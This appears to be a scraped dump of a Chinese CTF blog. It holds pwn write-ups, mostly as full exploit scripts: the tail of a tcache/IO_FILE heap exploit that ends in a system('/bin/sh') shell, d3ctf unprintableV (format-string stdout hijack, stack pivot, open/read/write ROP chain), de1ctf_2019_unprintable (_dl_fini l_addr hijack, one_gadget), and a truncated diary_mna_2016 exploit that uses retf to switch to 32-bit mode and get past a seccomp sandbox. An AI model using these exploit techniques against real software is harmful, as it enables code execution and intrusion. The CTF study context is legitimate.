#10也就是chunk7的空间     #整理fastbin，使得fastbin变成unsorted bin     mallocConsolidate(sh)     #create后，libc中的指针传到了chunk6的fd处     #我们随便先把/bin/sh字符串保存到这里，最后free_hook时使用     create(sh,0x10,&#x27;/bin/sh&#x27;) #11     #低2字节覆盖，使得chunk6的fd有1/16的可能指向_IO_2_1_stdout_结构体-0x10处     create(sh,0x10,p16((_IO_2_1_stdout_s - 0x10) &amp; 0xFFFF)) #12     create(sh,0x38,&#x27;\\n&#x27;) #13     #假设chunk6的fd已经指向了_IO_2_1_stdout_，我们低位覆盖write_base指针     payload = &#x27;\\x00&#x27; * 0x10 + p64(0xfbad1800) + p64(0) * 3 + p8(0)     create(sh,0x38,payload) #14     response = sh.recvuntil(&#x27;done&#x27;)     #没有成功覆盖，说明我们没有命中_IO_2_1_stdout_结构体，抛出异常，重试     if len(response) &lt; 8:        raise Exception(&#x27;retry&#x27;)     #print response     #低位覆盖后，对应地址处的数据向后偏移8，正好是_IO_stdfile_2_lock的地址     _IO_stdfile_2_lock_addr = u64(response[8:16])     #计算出libc的地址     libc_base = _IO_stdfile_2_lock_addr - _IO_stdfile_2_lock     system_addr = libc_base + system_s     free_hook_addr = libc_base + free_s_hook     print &#x27;libc_base=&#x27;,hex(libc_base)     print &#x27;system_addr=&#x27;,hex(system_addr)     print &#x27;free_hook_addr=&#x27;,hex(free_hook_addr)     #让chunk8重新回到tcache中，作为头0x80 tcache bin的头     delete(sh,10)     #接下来，我们再申请，又从unsorted bin里切割一块，但是切得的这一块与chunk7有重合的部分，因此我们可以修改chunk7的fd，让它指向free_hook     payload = &#x27;\\x00&#x27; * 0x20 + p64(free_hook_addr)     create(sh,0x30,payload) #15     create(sh,0x50,&#x27;e&#x27;*0x50) #16     #将free_hook指向system     create(sh,0x50,p64(system_addr)) #17     #getshell     delete(sh,11)     sh.interactive()      while True:     try:        sh = process(&#x27;./new_heap&#x27;,env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)        crack(sh)     except:        sh.close()        print &#x27;retrying...&#x27;  ","categories":["CTF"],"tags":["tcache","UAF","IO FILE","glib 2.29","malloc_consolidate","IO FILE作malloc使用"]},{"title":"d3ctf unprintableV","url":"/2019/11/30/d3ctf_unprintableV/","content":"这是2019 d3ctf的一道pwn题，由于当时知识储备不够没做出来，赛后就好好研究，从中学到了新的知识\n首先，我们检查一下程序的保护机制\n\n\n除了canary，其它的保护都开了\n然后，我们用IDA分析一下\n这个沙箱函数，把execve函数给禁用了，所以，我们不能getshell，但是我们可以构造ROP链来把flag读取后再打印出来\n\n\n这是一个及其简单的程序，但是它的exp脚本会复杂的让你疯狂\n\n\n程序一开始给了我们a的地址，也就是menu的ebp-0x8的值，接着**[close(1)把文件描述符1标准输出给关了，那么之后如果调用输出函数，将不能输出出来。]{.mark}**\n然后，我们看看vuln函数，存在一个很明显的**[格式化字符串漏洞，但是由于这里字符串是存储在bss段的buf里，导致这个格式化字符串漏洞不是那么容易利用。]{.mark}**\n如果我们想实现任意地址写，还得先在栈上特殊构造一下。\n\n\n但是，由于**[标准输出被关闭了，导致信息泄露不出来。]{.mark}**\n但或许有什么办法可以解决，我们来看看printf的源代码\n/* Write formatted output to stdout from the format string FORMAT.  */  /* VARARGS1 */  int  __printf (const char *format, ...)  &#123;    va_list arg;    int done;      va_start (arg, format);    done = vfprintf (stdout, format, arg);    va_end (arg);      return done;  &#125;  \n\nprintf实际是调用fprintf，并且传入了stdout指针，我们来看看stdout指针是如何定义的\n#include &quot;libioP.h&quot;  #include &quot;stdio.h&quot;    #undef stdin  #undef stdout  #undef stderr  _IO_FILE *stdin = (FILE *) &amp;_IO_2_1_stdin_;  _IO_FILE *stdout = (FILE *) &amp;_IO_2_1_stdout_;  _IO_FILE *stderr = (FILE *) &amp;_IO_2_1_stderr_;    #undef _IO_stdin  #undef _IO_stdout  #undef _IO_stderr  #define AL(name) AL2 (name, _IO_##name)  #define AL2(name, al) \\    extern __typeof (name) al __attribute__ ((alias (#name),                    \\                                              visibility (&quot;hidden&quot;)))  AL(stdin);  AL(stdout);  AL(stderr);  \n\n而stdout、stdin、stderr这些是全局指针，因此，它们肯定存在于内存中的某个地方,bss段，我们要是能把stdout指针指向_IO_2_1_stderr_，那么就能输出了，IO_2_1_stderr_内部使用的文件描述符是2，而_IO_2_1_stdout_内部使用的文件描述符是1，它们在正常情况下，都向终端屏幕输出，因此，我们希望吧stdout指针指向_IO_2_1_stderr，我们在程序的bss段看到了这三个指针\n\n\n这三个指针是程序在运行时装载上去的，就犹如GOT表的装载一样，然后**[程序中只要用到这三个指针，都是从这里访问获取指针的值]{.mark}**\n下方不远处是buf\n\n\n由于程序告诉了我们buf的地址，那么通过低字节覆盖，我们也能得到stderr、stdin、stdout这三个指针自己的地址。\n那么，[我们该如何确定格式化字符串里参数在栈中的位置，比如%6$p这些？]{.mark}\n[我们可以在本地先把close(1)给nop掉，再利用%p-%p-%p-%p-%p-%p-%p-%p-%p-%p…来确定。最后测试时，重新拿原文件来测试]{.mark}\n\n\n假如，我们通过格式化字符串漏洞把这个数据低字节修改，使得它**[成为stdout指针的地址]{.mark}**，那么我们就能利用printf把stdout指针的内容改变，指向_IO_2_1_stderr_。但是，我们该如何来低字节修改这个数据呢？我们可以再借助这两个\n\n\n我们可以**[先往0x7FFF7543E1D0里低字节覆盖，使得0x7FFF7543E1D0里的数据为0x7FFF7543E1C8]{.mark}**，即buf指针a的地址\n然后，我们就能利用%t$hhn来对0x7FFF7543E1C8地址处写入了，我们先把a指向stdout\nsh.recvuntil(&#x27;0x&#x27;)  #获得a指针的地址  stack = int(sh.recvuntil(&#x27;\\n&#x27;,drop=True),16)  print hex(stack)    payload = &#x27;%&#x27; + str(stack &amp; 0xFF) + &#x27;c%6$hhn&#x27;  sh.recvuntil(&#x27;may you enjoy my printf test!\\n&#x27;)  sh.sendline(payload.ljust(0x12C-1,&#x27;\\x00&#x27;))  #注意，休眠是必要的  time.sleep(0.5)  payload = &#x27;%&#x27; + str(stdout_bss &amp; 0xFF) + &#x27;c%10$hhn&#x27;  sh.sendline(payload.ljust(0x12C-1,&#x27;\\x00&#x27;))  \n\n由于没有任何操作成功的提示，我们需要休眠一下，再继续发送数据\n现在，我们看看栈里的布局，（我们重新运行了程序，所以和前面的图有些不一样）\n\n\na指针成功指向了stdout指针，那么现在stdout指针的地址也在栈里了，我们就能继续利用printf，修改stdout指针的值了，我们只需低2个字节覆盖即可\n#注意，休眠是必要的  time.sleep(0.5)  payload = &#x27;%&#x27; + str(_IO_2_1_stderr_ &amp; 0xFFF) + &#x27;c%9$hn&#x27;  sh.sendline(payload.ljust(0x12C-1,&#x27;\\x00&#x27;))  \n\n我们之所以写**IO_2_1_stderr &amp; 0xFFF** 而不写_IO_2_1_stderr_ &amp; 0xFFFF的原因是，[经过调试，发现_IO_2_1_stderr_ &amp; 0xFFFF，printf执行后没有成功修改数据，可能是因为数据太大的原因]{.mark}，注意，我们对stdout指针的修改必须一次完成，因为，如果我们分开的话，由于stdout指针修改了，所以在没完成全部修改之前，stdout就指向了其他地方，不是FILE结构体，导致printf执行错误崩溃\n我们通过_IO_2_1_stderr_ &amp; 0xFFF和%9$hn，最终导致**[stdout指针的值的倒数第四个十六进制数为0]{.mark}，由于PIE的存在，我们有[1&#x2F;16的可能]{.mark}**，使得stdout指针正好指向_IO_2_1_stderr_结构体\n\n\n如上图，这次，我们没有成功让stdout指向_IO_2_1_stderr_，但是，只要我们不断的爆破，总有一次会成功，然后printf就可以正常输出了。\n我们利用这种方式检验是否成功指向_IO_2_1_stderr_\n#休眠是必要的  time.sleep(0.2)  sh.sendline(&#x27;aaaaaaa&#x27;.ljust(0x12C-1,&#x27;\\x00&#x27;))    x = sh.recvuntil(&#x27;aa&#x27;,timeout=0.5)  if &#x27;aa&#x27; not in x:     raise Exception(&#x27;retry&#x27;)  \n\n假设我们已经成功将stdout指针指向了_IO_2_1_stderr_结构体，接下来，我们就要来泄露信息了\n\n\n泄露这些信息，分别计算程序基址和libc基址，以及其他一些gadget和函数的地址\n#泄露main+0x2D的地址  payload = &#x27;%11$p%15$pTAG&#x27;  sh.sendline(payload.ljust(0x12C-1,&#x27;\\x00&#x27;))  sh.recvuntil(&#x27;0x&#x27;)  main_addr = int(sh.recvuntil(&#x27;0x&#x27;,drop=True),16) - 0x2D  elf_base = main_addr - main_s  pop_rsi_addr = pop_rsi + elf_base  pop_rdi_addr = pop_rdi + elf_base  buf_addr = buf_s + elf_base  leave_addr = leave + elf_base  #泄露__libc_start_main+E7的地址  __libc_start_main_addr = int(sh.recvuntil(&#x27;TAG&#x27;,drop=True),16) - 0xE7  libc_base = __libc_start_main_addr - __libc_start_main  open_addr = libc_base + open_s  read_addr = libc_base + read_s  write_addr = libc_base + write_s  pop_rdx_addr = libc_base + pop_rdx  print &#x27;elf_base=&#x27;,hex(elf_base)  print &#x27;libc_base=&#x27;,hex(libc_base)  \n\n以上的一些地址，我们在构造rop链实现如下代码，需要用到的\nfd = open(&quot;flag&quot;,0);  read(fd,buf+0x100,0x30);  write(2,buf+0x100,0x30);  \n\n如果全都用printf格式化漏洞来对栈里面写ROP链，那么会比较麻烦，因此，我们决定把ROP链放入bss段的buf里面，然后修改ebp，将栈转移到buf里去\n那么，我们该如何做**[栈转移]{.mark}**呢？\n\n\n如图，我们通过%6$hhn来将10的位置的数据低字节覆盖，使得10的数据为12的地址，然后我们就可以通过%10$hhn来依次修改12的数据，当我们需要修改12的前一个字节时，只需再通过%6$hhn来改变10的数据，然后用%10$hhn来继续对12的前一个字节写。\ndef write_i(sh,stack,index,addr):     i = 0     while addr &gt; 0:        sh.recvuntil(&#x27;TAG&#x27;)        #设定栈顶向下第10个数据为stack+0x8*index        payload = &#x27;%&#x27; + str((stack + 0x8*index + i) &amp; 0xFF) + &#x27;c%6$hhnTAG&#x27;        sh.sendline(payload)        sh.recvuntil(&#x27;TAG&#x27;)        data = addr &amp; 0xFF        payload = &#x27;%&#x27; + str(data) + &#x27;c%10$hhnTAG&#x27;        sh.sendline(payload.ljust(0x12C-1,&#x27;\\x00&#x27;))        addr = addr &gt;&gt; 8        i+=1  \n\n然后，我们这样调用\n#我们修改main的rbp，做栈迁移  write_i(sh,stack,3,buf_addr)  #这次，我们写main的返回地址，也就是main ebp后面那个空间  write_i(sh,stack,4,leave_addr)  \n\n其中leave_addr地址处是指令leave;retn，而leave指令相当于\nmov rsp,rbp  pop rbp  \n\n\n\n这样，当main函数执行到leave时，有\nmov rsp,rbp  pop rbp  \n\n那么，ebp的值变成了我们的buf地址，但是esp还没有指向buf，于是，我们就在接下来的返回地址覆盖为leave_addr,让它再执行一次leave，那么有\nmov rsp,rbp  pop rbp  \n\n现在，[rsp指向了buf]{.mark},但是rbp变成buf[0]的数据，这没什么问题，因为，做栈迁移，我们只需保证rsp指向了指定位置即可，由于pop rbp，rsp要加8，也就是说，这里执行后，[rsp指向了buf+8处]{.mark}，retn就会从buf+8处取出一个数据当成地址，跳到那个地址处去执行，因此，[我们只需在buf+8处写ROP链即可]{.mark}。\n为了能够正常到达main的栈中rbp数据处，[我们需要复原menu在栈中的rbp数据]{.mark}\n#我们需要复原menu的rbp  payload = &#x27;%&#x27; + str((stack + 0x18) &amp; 0xFF) + &#x27;c%6$hhnTAG&#x27;  sh.sendline(payload)  \n\n构造ROP时，有些gadget可能在程序二进制文件里没有，我们可以去libc.so.6中找找。只需利用ROPgadget工具即可\nROPgadget –binary libc.so.6 –only ‘pop|ret’ | grep ‘rdx’\n然后，我们就开始构造ROP链了\n#现在当退出main时，栈就会转移到buf里去  rop = &#x27;d^3CTF&#x27;.ljust(8,&#x27;\\x00&#x27;)  #rsi = 0  rop += p64(pop_rsi_addr) + p64(0) + p64(0)  #rdi = &#x27;flag&#x27;，我们把flag字符串存到buf+0xC8处  rop += p64(pop_rdi_addr) + p64(buf_addr + 0xC8)  #open  rop += p64(open_addr)  #rdx = 0x30  rop += p64(pop_rdx_addr) + p64(0x30)  #rdi = buf + 0x100,我们把读取的结果存在buf+0x100处  rop += p64(pop_rsi_addr) + p64(buf_addr+0x100) + p64(0)  #fd = 1,文件描述符1是现在对应打开的flag文件  rop += p64(pop_rdi_addr) + p64(1)  #read  rop += p64(read_addr)  #rdx = 0x30  rop += p64(pop_rdx_addr) + p64(0x30)  #rdi = buf + 0x100  rop += p64(pop_rsi_addr) + p64(buf_addr+0x100) + p64(0)  #fd = 2,文件描述符2是stderr  rop += p64(pop_rdi_addr) + p64(2)  #write  rop += p64(write_addr)  rop = rop.ljust(0xC8,&#x27;\\x00&#x27;)  #存入flag字符串  rop += &#x27;flag\\x00&#x27;  rop = rop.ljust(0x12C-1,&#x27;\\x00&#x27;)    sh.sendline(rop)  \n\n我们在**[开头写入了d^3CTFx00]{.mark}**，使得经过printf后，程序检测到d^3CTF，就直接退出main，就能执行我们的ROP链了，这样一次性搞定\n需要注意的是文件描述符1对应了我们打开的flag文件，因为之前close(1)，所以当我们open时，1就会被利用起来。也可以具体调试一下，得到文件描述符。\n\n\n综上，我们的exp脚本\n#coding:utf8  from pwn import *  import time    elf = ELF(&#x27;./unprintableV&#x27;)  libc = ELF(&#x27;./libc.so.6&#x27;)  stdout_bss = elf.symbols[&#x27;stdout&#x27;]  _IO_2_1_stderr_ = libc.symbols[&#x27;_IO_2_1_stderr_&#x27;]  __libc_start_main = libc.sym[&#x27;__libc_start_main&#x27;]  main_s = elf.symbols[&#x27;main&#x27;]  buf_s = elf.symbols[&#x27;buf&#x27;]  open_s = libc.sym[&#x27;open&#x27;]  read_s = libc.sym[&#x27;read&#x27;]  write_s = libc.sym[&#x27;write&#x27;]  #pop rsi  #pop r15  #retn  pop_rsi = 0xBC1  #pop rdi  #retn  pop_rdi = 0xBC3  #leave  #retn  leave = 0xB56  #libc.so.6中  #pop rdx ;ret  pop_rdx = 0x1b96    def write_i(sh,stack,index,addr):     i = 0     while addr &gt; 0:        #sh.recvuntil(&#x27;TAG&#x27;)        #设定栈顶向下第10个数据为stack+0x8*index        payload = &#x27;%&#x27; + str((stack + 0x8*index + i) &amp; 0xFF) + &#x27;c%6$hhnTAG&#x27;        sh.sendline(payload)        sh.recvuntil(&#x27;TAG&#x27;)        data = addr &amp; 0xFF        payload = &#x27;%&#x27; + str(data) + &#x27;c%10$hhnTAG&#x27;        sh.sendline(payload.ljust(0x12C-1,&#x27;\\x00&#x27;))        sh.recvuntil(&#x27;TAG&#x27;)        addr = addr &gt;&gt; 8        i+=1    def crack(sh):     sh.recvuntil(&#x27;0x&#x27;)     #获得a指针的地址     stack = int(sh.recvuntil(&#x27;\\n&#x27;,drop=True),16)     print hex(stack)       payload = &#x27;%&#x27; + str(stack &amp; 0xFF) + &#x27;c%6$hhn&#x27;     sh.recvuntil(&#x27;may you enjoy my printf test!\\n&#x27;)     sh.sendline(payload.ljust(0x12C-1,&#x27;\\x00&#x27;))     #注意，休眠是必要的     time.sleep(0.5)     payload = &#x27;%&#x27; + str(stdout_bss &amp; 0xFF) + &#x27;c%10$hhn&#x27;     sh.sendline(payload.ljust(0x12C-1,&#x27;\\x00&#x27;))     #注意，休眠是必要的     time.sleep(0.5)     payload = &#x27;%&#x27; + str(_IO_2_1_stderr_ &amp; 0xFFF) + &#x27;c%9$hn&#x27;     sh.sendline(payload.ljust(0x12C-1,&#x27;\\x00&#x27;))     #休眠是必要的     time.sleep(0.2)     sh.sendline(&#x27;aaaaaaa&#x27;.ljust(0x12C-1,&#x27;\\x00&#x27;))       x = sh.recvuntil(&#x27;aa&#x27;,timeout=0.5)     if &#x27;aa&#x27; not in x:        raise Exception(&#x27;retry&#x27;)     #泄露main+0x2D的地址     payload = &#x27;%11$p%15$pTAG&#x27;     sh.sendline(payload.ljust(0x12C-1,&#x27;\\x00&#x27;))     sh.recvuntil(&#x27;0x&#x27;)     main_addr = int(sh.recvuntil(&#x27;0x&#x27;,drop=True),16) - 0x2D     elf_base = main_addr - main_s     pop_rsi_addr = pop_rsi + elf_base     pop_rdi_addr = pop_rdi + elf_base     buf_addr = buf_s + elf_base     leave_addr = leave + elf_base     #泄露__libc_start_main+E7的地址     __libc_start_main_addr = int(sh.recvuntil(&#x27;TAG&#x27;,drop=True),16) - 0xE7     libc_base = __libc_start_main_addr - __libc_start_main     open_addr = libc_base + open_s     read_addr = libc_base + read_s     write_addr = libc_base + write_s     pop_rdx_addr = libc_base + pop_rdx     print &#x27;elf_base=&#x27;,hex(elf_base)     print &#x27;libc_base=&#x27;,hex(libc_base)       #我们修改main的rbp，做栈迁移     write_i(sh,stack,3,buf_addr)     #这次，我们写main的返回地址，也就是main ebp后面那个空间     write_i(sh,stack,4,leave_addr)       #我们需要复原menu的rbp     payload = &#x27;%&#x27; + str((stack + 0x18) &amp; 0xFF) + &#x27;c%6$hhnTAG&#x27;     sh.sendline(payload)       #现在当退出main时，栈就会转移到buf里去     rop = &#x27;d^3CTF&#x27;.ljust(8,&#x27;\\x00&#x27;)     #rsi = 0     rop += p64(pop_rsi_addr) + p64(0) + p64(0)     #rdi = &#x27;flag&#x27;，我们把flag字符串存到buf+0xC8处     rop += p64(pop_rdi_addr) + p64(buf_addr + 0xC8)     #open     rop += p64(open_addr)     #rdx = 0x30     rop += p64(pop_rdx_addr) + p64(0x30)     #rdi = buf + 0x100,我们把读取的结果存在buf+0x100处     rop += p64(pop_rsi_addr) + p64(buf_addr+0x100) + p64(0)     #fd = 1,文件描述符1是现在对应打开的flag文件     rop += p64(pop_rdi_addr) + p64(1)     #read     rop += p64(read_addr)     #rdx = 0x30     rop += p64(pop_rdx_addr) + p64(0x30)     #rdi = buf + 0x100     rop += p64(pop_rsi_addr) + p64(buf_addr+0x100) + p64(0)     #fd = 2,文件描述符2是stderr     rop += p64(pop_rdi_addr) + p64(2)     #write     rop += p64(write_addr)     rop = rop.ljust(0xC8,&#x27;\\x00&#x27;)     #存入flag字符串     rop += &#x27;flag\\x00&#x27;     rop = rop.ljust(0x12C-1,&#x27;\\x00&#x27;)       sh.sendline(rop)       sh.interactive()    while True:     try:        sh = process(&#x27;./unprintableV&#x27;,env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)        crack(sh)     except BaseException as e:        print e        sh.kill()        print &#x27;retrying...&#x27;","categories":["CTF"],"tags":["ROP","格式化字符串漏洞","栈迁移","IO FILE"]},{"title":"de1ctf_2019_unprintable(_dl_fini的l_addr劫持妙用)","url":"/2020/06/11/de1ctf_2019_unprintable/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，存在一个非栈上的格式化字符串漏洞，但是关闭了文件描述符1，导致不能输出，并且printf结束后就调用了exit(0)\n\n\n看看栈里有没有什么可用的数据\n\n\n基本没有，要想劫持printf返回地址进而多次利用，是不行的，因为printf一次性不能实现，即不能修改栈中数据指向printf返回地址后继续利用新得到这个地址取修改printf返回地址，即其不具有传递性，其值依然是之前的值，因此必须分步。\n在这里，我们发现一个有用的指针，[该指针指向的地方正好就对应着dl的linkmap-&gt;l_addr]{.mark}\n\n\nexit会调用dl_fini函数，我们看看dl_fini函数的源码\n\n\n本来l-&gt;l_addr为0，而l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr指针指向程序中的fini_array段的地址，也就是l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr的值为0x0000000000600DD8\n\n\n现在，我们劫持l_addr，使得l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr偏移到我们的buf里，这样，我们就能在buf里伪造fini_array，进而进行二次利用。\n因此，第一次，我们的payload为\npayload =&#x27;%&#x27;+str(0x298)+&#x27;c&#x27;+&#x27;%26$hn&#x27;payload = payload.ljust(16,&#x27;\\x00&#x27;)+p64(0x00000000004007A3)sh.sendline(payload)\n\n这样做以后,l-&gt;addr变成了0x298，l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr处就偏移到了我们buf里，而此处我们布下了地址0x00000000004007A3，于是0x00000000004007A3处会被执行。\n当第二次回到printf的时候，栈里已经有许多成链的栈地址可以用了，并且，有一个直接指向了printf的返回地址，我们可以直接利用。\n\n\n这样，我们就在buf里布置下rop，然后利用printf成链攻击劫持函数栈迁移返回到buf里执行rop。\n其中有一个gadget，我们可以用来将bss段上的stdout指针改成one_gadget地址，然后在csu里面进行call即可。\n.text:00000000004006E8 adc [rbp+48h], edx\n#coding:utf8from pwn import *libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)#pop rsp ; pop r13 ; pop r14 ; pop r15 ; retpop_rsp = 0x000000000040082dcsu_pop = 0x000000000040082Acsu_call = 0x0000000000400810stderr_ptr_addr = 0x0000000000601040one_gadget = 0xf1147offset = one_gadget - libc.sym[&#x27;_IO_2_1_stderr_&#x27;]&#x27;&#x27;&#x27;.text:00000000004006E8 adc     [rbp+48h], edx.text:00000000004006EB mov     ebp, esp.text:00000000004006ED call    deregister_tm_clones.text:00000000004006F2 pop     rbp.text:00000000004006F3 mov     cs:completed_7594, 1.text:00000000004006FA rep retn&#x27;&#x27;&#x27;adc_p_rbp_edx = 0x00000000004006E8sh = process(&#x27;./de1ctf_2019_unprintable&#x27;)#sh = remote(&#x27;node3.buuoj.cn&#x27;,26685)sh.recvuntil(&#x27;This is your gift: &#x27;)stack_addr = int(sh.recvuntil(&#x27;\\n&#x27;,drop = True),16)print &#x27;stack_addr=&#x27;,hex(stack_addr)#第一步，更改ld.so里的offset，使得array函数数组偏移到bss段上的buf里，重新执行read、printf#第一步的作用是在栈里留下了大量的栈指针payload =&#x27;%&#x27;+str(0x298)+&#x27;c&#x27;+&#x27;%26$hn&#x27;payload = payload.ljust(16,&#x27;\\x00&#x27;)+p64(0x00000000004007A3)sh.sendline(payload)sleep(0.5)rop_addr = 0x0000000000601260#利用gadget将stderr指针改为one_gadget指针rop = p64(csu_pop)tmp = stderr_ptr_addr-0x48rop += p64(tmp-1) #rbxrop += p64(tmp) #rbprop += p64(rop_addr + 0x8 * 6 - tmp * 8 + 0x10000000000000000) #r12rop += p64(offset + 0x10000000000000000) #r13rop += p64(adc_p_rbp_edx) #r14rop += p64(0) #r15rop += p64(csu_call)#调用one_gadgetrop += p64(csu_pop)rop += p64(0) #rbxrop += p64(1) #rbprop += p64(stderr_ptr_addr) #r12rop += p64(0) #r13rop += p64(0) #r14rop += p64(0) #r15rop += p64(csu_call)rop_addr = rop_addr - 0x18#第二次，我们在buf里布下rop，同时劫持printf返回地址，进行下一轮利用stdout_ptr_addr = 0x0000000000601020payload = &#x27;%&#x27; + str(0xA3) + &#x27;c%23$hhn&#x27;payload = payload.ljust(0x200,&#x27;\\x00&#x27;)payload += ropsh.sendline(payload)sleep(0.5)#接下来我们在栈里布下rop_addrfor i in range(6):   data = (stack_addr - 0x118 + i) &amp; 0xFF   if data &lt; 0xA3:      payload = &#x27;%&#x27; + str(data) + &#x27;c%18$hhn%&#x27; + str(0xA3-data) + &#x27;c%23$hhn&#x27;   else:      payload = &#x27;%&#x27; + str(data) + &#x27;c%23$hhn%&#x27; + str(data-0xA3) + &#x27;c%18$hhn&#x27;   sh.sendline(payload)   sleep(0.5)   data = rop_addr &amp; 0xFF   if data == 0:      payload = &#x27;%13$hhn%&#x27; + str(0xA3) + &#x27;c%23$hhn&#x27;   else:      if data &lt; 0xA3:         payload = &#x27;%&#x27; + str(data) + &#x27;c%13$hhn%&#x27; + str(0xA3-data) + &#x27;c%23$hhn&#x27;      else:         payload = &#x27;%&#x27; + str(data) + &#x27;c%23$hhn%&#x27; + str(data-0xA3) + &#x27;c%13$hhn&#x27;   rop_addr = rop_addr &gt;&gt; 0x8   sh.sendline(payload)   sleep(0.5)sleep(0.5)#接下来，劫持printf的返回地址为pop rsp，使得栈迁移到buf里执行roppayload = &#x27;%&#x27; + str(pop_rsp &amp; 0xFFFF) + &#x27;c%23$hn&#x27;sh.sendline(payload)sh.interactive()","categories":["CTF"],"tags":["格式化字符串漏洞","linkmap"]},{"title":"diary_mna_2016","url":"/2020/07/24/diary_mna_2016/","content":"首先，检查一下程序的保护机制\n\n\n然后检查一下沙箱机制，发现禁用了execve还有open函数，但是没有对sys_number的范围进行判断，因此，可以利用retf切换到32位模式绕过沙箱。\n\n\n然后，我们用IDA分析一下，输入函数存在off by one。\n\n\n程序自己用链表实现了一个堆块管理器。\n\n\n其free功能使用的是unlink，将堆块取出、合并等操作，但是缺少链表完整性检查\n\n\n\n\n这里，我们unlink不能直接将got表修改为system_addr的地址，因为这里unlink的操作，要保证fd和bk都为可写的地址。因此，一个好的方法是设置fd为bss上stdout指针的地址-x10，设置bk为一个堆地址，这样，unlink以后stdout指针被修改为一个堆地址，我们只需要在堆里伪造好_IO_2_1_stdout_结构体即可。\n由于heap是使用mmap映射出来的，因此，其地址靠近lib地址\n\n\n但是其地址与libc地址的偏移在本地和远程是不一样的，但是可以在一个范围内爆破。爆破方法见我的这篇文章https://blog.csdn.net/seaaseesa/article/details/107072062。\n#coding:utf8from pwn import *#sh = process(&#x27;./diary_mna_2016&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)#sh = remote(&#x27;node3.buuoj.cn&#x27;,26394)#sh = remote(&#x27;127.0.0.1&#x27;,8666)libc = ELF(&#x27;./libc-2.23.so&#x27;)#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)stdout_bss_addr = 0x00000000006020F0def add(index,size,content,line = True):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;Input date&#x27;,&#x27;1970/01/&#x27; + str(index).rjust(2,&#x27;0&#x27;))   sh.sendlineafter(&#x27;size&#x27;,str(size))   if line:      sh.sendlineafter(&#x27;happened on&#x27;,content)   else:      sh.sendafter(&#x27;happened on&#x27;,content)def show(index):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;Input date&#x27;,&#x27;1970/01/&#x27; + str(index).rjust(2,&#x27;0&#x27;))def delete(index):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;Input date&#x27;,&#x27;1970/01/&#x27; + str(index).rjust(2,&#x27;0&#x27;))def exploit(offset):   add(1,0x200,&#x27;a&#x27;*0xFF)   add(2,0x100,&#x27;b&#x27;*0xFF)   add(3,0x60,&#x27;c&#x27;*0x10)   add(4,0x120,&#x27;d&#x27;*0x10)   add(5,0x60,&#x27;e&#x27;*0x10)   delete(2)   add(2,0x100,&#x27;b&#x27;,False)   show(2)   sh.recvuntil(&#x27;\\n&#x27;)   heap_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;)) ^ ord(&#x27;b&#x27;)   libc_base = heap_addr - offset   pop_rdi = libc_base + 0x0000000000021102   pop_rsi = libc_base + 0x00000000000202e8   pop_rdx = libc_base + 0x0000000000001b92   pop_rax = libc_base + 0x0000000000033544   jmp_rdi = libc_base + 0x000000000006caa4   &#x27;&#x27;&#x27;pop_rdi = libc_base + 0x0000000000021112   pop_rsi = libc_base + 0x00000000000202f8   pop_rdx = libc_base + 0x0000000000001b92   pop_rax = libc_base + 0x000000000003a738   jmp_rdi = libc_base + 0x000000000006cab4   &#x27;&#x27;&#x27;   mprotect_addr = libc_base + libc.sym[&#x27;mprotect&#x27;]   setcontext_x = libc_base + libc.sym[&#x27;setcontext&#x27;] + 0x35   print &#x27;libc_base=&#x27;,hex(libc_base)   fake_file = p64(0) + p64(0)   fake_file = fake_file.ljust(0x88,&#x27;\\x00&#x27;)   fake_file += p64(heap_addr - 0x4D0)   fake_file = fake_file.ljust(0xA0,&#x27;\\x00&#x27;)   fake_file += p64(heap_addr - 0x3E8)   fake_file += p64(pop_rdi)   fake_file = fake_file.ljust(0xC0,&#x27;\\x00&#x27;)   fake_file += p64(0xFFFFFFFF)   fake_file += p64(0)*2   #vtable指针   fake_file += p64(heap_addr - 0x3F0 - 0x38)   fake_file += p64(setcontext_x) #vtable   shellcode_addr = heap_addr + 0x100   #接下来布置rop，跳到shellcode里去   fake_file += p64(shellcode_addr) + p64(pop_rsi) + p64(0x200) + p64(pop_rdx) + p64(0x7) + p64(mprotect_addr) + p64(jmp_rdi)   delete(1)   add(1,0x200,fake_file)   #先调用read输入32位shellcode，然后使用retf切换到32位模式，执行32位shellcode   shellcode = asm(&#x27;&#x27;&#x27;/*mmap*/                      mov r9d,0                      mov r8d,0xFFFFFFFF                      mov r10,0x22                      mov edx,7                      mov esi,0x1000                      mov edi,0x160000                      mov eax,9                      syscall                      /*write*/                      mov rax,0x3A7475706E69                      push rax                      mov rax,1                      mov rdi,rax                      mov rsi,rsp                      mov rdx,6                      syscall                      /*read*/                      xor rax,rax                      xor rdi,rdi                      mov rsi,0x160800                      mov rdx,0x100                      syscall                      /*retf*/                      xor rsp,rsp                      mov esp,0x160700                      mov dword ptr[esp+4],0x23                      mov dword ptr[esp],0x160800                      retf                   &#x27;&#x27;&#x27;,arch=&quot;amd64&quot;)   add(6,0x200,shellcode)   delete(3)   payload = p64(stdout_bss_addr - 0x10) + p64(heap_addr - 0x4D0)   payload = payload.ljust(0x58,&#x27;c&#x27;)   payload += p64(0x68) #prev_size   payload += p8(0x28)   add(3,0x60,payload,False)   #unlink修改stdout指针   delete(4)   shellcode = asm(shellcraft.open(&#x27;./flag&#x27;) + shellcraft.read(3,&#x27;esp&#x27;,0x30) + shellcraft.write(1,&#x27;esp&#x27;,0x30))   sh.sendafter(&#x27;input:&#x27;,shellcode)for x in range(0xD0,0xFF):   try:      global sh      #sh = 